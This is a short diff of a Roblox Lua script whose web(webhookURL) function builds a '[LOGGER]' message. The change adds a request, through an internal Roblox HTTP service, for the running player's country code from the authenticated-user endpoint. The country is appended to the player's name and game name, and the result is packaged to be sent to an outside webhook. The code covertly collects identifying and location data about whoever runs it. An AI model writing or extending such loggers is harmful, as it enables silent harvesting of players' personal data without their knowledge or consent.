@@ -4,7 +4,10 @@ local function web(webhookURL)
         local playerName = game.Players.LocalPlayer.Name
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         
-        local message = "[LOGGER] " .. playerName .. " in " .. gameName .. "."
+        local countryInfo = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl("https://users.roblox.com/v1/users/authenticated/country-code"))
+        local country = countryInfo.countryCode or "Unknown" 
+        
+        local message = "[LOGGER] " .. playerName .. " from " .. country .. " in " .. gameName .. "."
         local requestBody = { content = message }
         local headers = { ["Content-Type"] = "application/json" }
 
